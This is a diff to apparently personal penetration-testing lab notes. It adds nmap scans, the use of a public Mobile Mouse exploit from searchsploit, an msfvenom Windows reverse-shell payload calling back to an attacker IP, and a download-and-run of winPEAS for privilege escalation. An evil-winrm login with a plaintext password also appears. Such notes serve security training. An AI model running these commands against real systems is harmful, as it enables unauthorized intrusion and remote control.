@@ -143,6 +143,7 @@ evil-winrm -i 10.10.110.154 -u administrator -p hghgib6vHT3bVWf
 ```
 nmap 192.168.230.155
 nmap -sT -A -p 9099 -Pn 192.168.230.155
+nmap -sT -A -p 9999 -Pn 192.168.230.155
 nmap -sT -A -p 80,9099,9999,35913 -Pn 192.168.230.155
 sudo nmap -O 192.168.230.155 --osscan-guess
 # snmp also open
@@ -154,9 +155,20 @@ nikto -host 192.168.230.155 -port 80
 whatweb http://192.168.230.155
 gobuster dir -u http://192.168.230.155 -w /usr/share/wordlists/dirb/common.txt
 feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.230.155
-gobuster dir -u http://192.168.230.155 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
 
+# initial vector
+# search for port 9099, find that it's mouse server and find exploit
+# another version of exploit: https://github.com/blue0x1/mobilemouse-exploit
+searchsploit -m 51010
+
+# modify exploit, serve up shell and run
+python3 51010.py --target 192.168.230.155 --file shell.exe --lhost 192.168.45.234
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=1234 -f exe -o shell.exe
+```
 
+.155 privesc
+```
+iwr -uri http://192.168.45.234/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
 ```
